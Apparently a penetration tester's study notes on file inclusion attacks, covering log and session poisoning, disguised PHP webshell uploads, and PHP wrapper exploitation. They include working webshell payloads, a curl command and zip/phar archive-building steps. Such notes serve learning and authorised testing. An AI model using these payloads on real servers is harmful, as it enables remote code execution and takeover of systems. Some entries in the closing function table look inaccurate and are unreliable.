# File Inclusion


## Local File Inclusion

File inclusion is when a file (that was not intended to be executed) is executed by manipulating interactions with the website.

The difference between file inclusion vs path / directory traversal is that traversal allows you to read files within the response whereas inclusion will execute them.

Traversal can be used as part of a wider LFI attack.

When you do this with local files on the system. E.g. you do log poisoning to insert some rando PHP code via logged request metadata. You're able to exploit an LFI vulnerability such as via traversal. You include the log file and the PHP is executed (assuming PHP is server side).

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html


## Remote File Inclusion

File inclusion using SSRF rather than local files. Can be used to execute webshell server-side.

We can try different protocols, such as `http://` for HTTP, `ftp://` for FTP or `file://` / `\\UNC_PATH` for SMB.

## LFI + File Upload

We might want to try to upload files that can then be included. The file upload functionality itself doesn't really need to be vulnerable.

If we consider a picture upload functionality then we can upload a PHP script and if needed prepend the magic bytes required to pass the upload validation, such as

```
GIF8<?php system($_GET['cmd']); ?>
```

for GIFs. Can be done for a lot of image or general file types.

We can also do the same for zips or phars, check out below wrappers sections for deets on this.


## LFI + Log Poisoning

### PHP Session Poisoning

PHP applications typically use the `PHPSESSID` cookie. Let's say the value of our session cookie is `blahblah`, by default the details for this session are stored in either
- `/var/lib/php/sessions/` for Linux
- `C:\Windows\Temp\` for Windows

The file containing the details specific to our session will just be `sess_` + the cookie ID value, in our case `blahblah` so the full path (e.g. on Linux) would be `/var/lib/php/sessions/sess_blahblah`.

If we have read access to the file as the server's user, then we can examine the session data and see if we have control over anything we can poison with executable PHP code.

**So the first step is try including the session file**. If successful, then look for a parameter we can have control over and poison with e.g. a PHP webshell. Finally, we can LFI the session file and exploit for a webshell.

**Note:** Once the attack is confirmed, try to use a persistent webshell or reverse shell since making subsequent requests might alter our payload depending on the session behaviour.

### Server Log Poisoning

Server logs might be poison-able too. Try including the server's log file. The default log files for Apache and Nginx are as follows:

| Server | Linux | Windows |
| ------ | ----- | ------- |
| Apache | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |
| Nginx | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |

We should also try for other poisonable files, like `error.log` or variations of the paths. Try this fuzz wordlist to identify a readable file from SecLists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI. There is also the Jhaddi wordlist: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

The next step is to poison the file, and this is dependent on what the user-controllable data is. In the case of access.log, we could simply try modifying the `User-Agent` header in an arbitrary web request to specify a PHP webshell.

Then include the log file and exploit.


## PHP Wrappers

PHP Wrappers are protocols that can be used to enhance the language's capabitilities. E.g. we can use `php://filter` to read PHP code as well as execute it rather than *just* executing it.

### Recon

If we see that tags / content is missing from the raw HTML (e.g. missing `</body>` tag), then we can assume some kind of server-side execution is occuring here. If this is PHP, then we can use wrappers to include, read and execute the code.

### Filter Wrapper

This is used to include the contents of an included PHP file. e.g.:

```
http://vulnerable-website.com/index.php?page=php://filter/resource=admin.php
```

To actually view the contents, we need to use `read` parameter with a `convert.base64-encode` value to base64 encode the source code before the server returns the file. This will prevent the server from parsing PHP and omitting the source code in the response.

The `resource` parameter allows us to specify a resource to target (e.g. file to include) with the resource name passed as the param value.

Together, this looks like `php://filter/read=convert.base64-encode/resource=<resource>` e.g.

```
http://vulnerable-website.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Then base64 decode the included file to read the contents.

ALSO TRY THIS WITHOUT .php IF YOU SUSPECT THE INPUT HANDLING AUTOMATICALLY APPENDS THE EXTENSION!!!

### Data Wrapper

- Allows for code execution
- Requires `allow_url_include` setting to be enabled in PHP configuration.
- Can be sent in plaintext or base64:

We can check if `allow_url_include` is enabled by using the `php://filter` wrapper to read the PHP engine's configuration, which on Linux is stored at either:

- `/etc/php/X.Y/apache2/php.ini` for Apache; or
- `/etc/php/X.Y/fpm/php.ini` for NGINX

where `X.Y` is the PHP version number. Try with the latest and backtrack through versions if it doesn't work. Also, make sure you're using `read=convert.base64-encode` in the wrapper to avoid breaking the attack and having the server parse the raw `.ini` file rather than just reading and returning its contents.

There should hopefully be a line like `allow_url_include = On` which means we can use the data wrapper, input wrapper, or even exploit RFI if there is a vector for it.

```
# Plaintext
http://vulnerable-website.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');%20?>

# Base64
http://vulnerable-website.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```

### Input Wrapper

Similar to the data wrapper in that we can achieve code execution, the primary difference is that our attack payload must be sent as a POST request, so the vulnerable file inclusion parameter must accept POST requests.

`allow_url_include` must also be set to `On` as explained in the data wrapper section above.

Example with cURL (modify for whatever the attack needs to be):

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://vulnerable-website.com/index.php?page=php://input&cmd=id"
```

**Note:** in the example above, we're assuming the vulnerable input is allowing POST data *in addition to* GET data to be referenced to read the `"cmd"` argument. If this doesn't work, just directly embed the command in the POST attack payload rather than attempting a dynamic web shell e.g. going from `<?php system($_GET["cmd"]); ?>` to `<?php system('id') ?>`.

### Expect Wrapper

Expect allows us to run commands directly through URL streams. It doesn't need to run as a web shell necessarily, though the end result to an attacker will be pretty much the same.

Expect is NOT installed by default so we need to confirm if has been manually installed and enabled on the backend. We can do this by reading the `php.ini` file as outlined in the data wrapper section above and grepping for the keyword `expect`. Should get something like `extension=expect`.

If enabled, obtaining RCE through file inclusion is as easy as submitting the payload `expect://<COMMAND>` in the vulnerable inclusion parameter.

### Zip Wrapper

Good to exploit if we can upload a zip, but need to check if the `zip://` wrapper is allowed in the config.

Sometimes, even if zip uploads are disallowed, we can try to hide it as an innocent-looking file type, but more robust validations will pick up on this and reject the upload. Therefore, we have a better chance of exploitation if the upload functionality explicitly allows zip uploads.

Create the malicious zip (in this case as a JPEG to bypass a basic file-extension validation mechanism):

```
link@kali:~$ echo '<?php system($_GET["cmd"]) ?>' > shell.php
link@kali:~$ zip shell.jpg shell.php
```

Upload the zip and use the `#` character to specify the file to execute (shell.php) --> we'll need to URL encode this hash character.

Include the file in the LFI vulnerability with `zip://./required-directory/if-needed/shell.jpg%23shell.php&cmd=whoami`

### Phar Wrapper

Similar to above. Create a php archive (phar), e.g. with the below code in shell.php:

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This will, when called, write a webshell to `shell.txt` sub-file which can be interacted with.

E.g.

```
link@kali:~$ php --define phar.readonly=0 shell.php

// Optionally, rename it to something that can actually be uploaded to the web app
link@kali:~$ mv shell.phar shell.jpg
```

Now exploit LFI to include the archive with the `phar://` PHP wrapper and specify the sub-file with `/shell.txt` (with the `/` URL encoded) as below:

`phar://.required-directory/if-needed/shell.jpg%2Fshell.txt&cmd=whoami`


## Backend Function Exploitability

| Function | Read | Execute | RFI |
| -------- | ---- | ------- | --- |
| **PHP**  | | | |
| `include()` / `include_once()` | O | O | O |
| `require()` / `require_once()` | O | O | X |
| `file_get_contents()` | O | X | O |
| `fopen()` / `file()` | O | X | O |
| **NodeJS** | | |
| `fs.readFile()` | O | X | X |
| `fs.sendFile()` | O | X | X |
| `res.sender()` | O | O | X |
| **Java** | | | |
| `include` | O | X | X |
| `import` | O | O | O |
| **.NET** | | | |
| `@Html.Partial()` | O | X | X |
| `@Html.RemotePartial()` | O | X | O |
| `Response.WriteFile()` | O | X | X |
| `include` | O | O | O |